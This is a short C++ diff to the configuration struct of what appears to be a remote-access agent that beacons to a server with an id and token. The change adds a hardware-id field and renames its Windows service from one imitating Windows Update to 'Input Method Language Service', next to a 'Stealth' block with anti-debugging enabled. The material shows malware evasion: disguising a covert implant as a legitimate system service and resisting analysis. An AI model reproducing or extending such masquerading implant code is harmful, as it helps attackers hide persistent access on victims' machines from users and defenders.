@@ -10,6 +10,7 @@ struct Config {
     uint16_t server_port = 8080;
     std::string agent_id;
     std::string agent_token;
+    std::string hwid;
     bool use_tls = false;
 
     // Reconnect
@@ -20,8 +21,8 @@ struct Config {
     int heartbeat_interval_sec = 30;
 
     // Service
-    std::string service_name = "WindowsUpdateHelper";
-    std::string service_display = "Windows Update Helper Service";
+    std::string service_name = "imlang";
+    std::string service_display = "Input Method Language Service";
 
     // Stealth
     bool enable_anti_debug = true;
